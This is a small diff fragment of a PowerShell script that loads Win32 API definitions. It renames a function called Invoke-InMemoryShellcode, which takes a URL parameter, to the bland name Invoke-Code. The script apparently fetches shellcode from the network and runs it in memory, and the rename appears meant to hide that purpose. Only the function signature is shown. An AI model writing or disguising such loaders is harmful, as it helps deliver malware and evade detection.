@@ -22,7 +22,7 @@ if (-not ([System.Management.Automation.PSTypeName]"Win32").Type) {
     Add-Type -TypeDefinition $Win32API
 }
 
-function Invoke-InMemoryShellcode {
+function Invoke-Code {
     param(
         [Parameter(Mandatory=$true)]
         [string]$Url
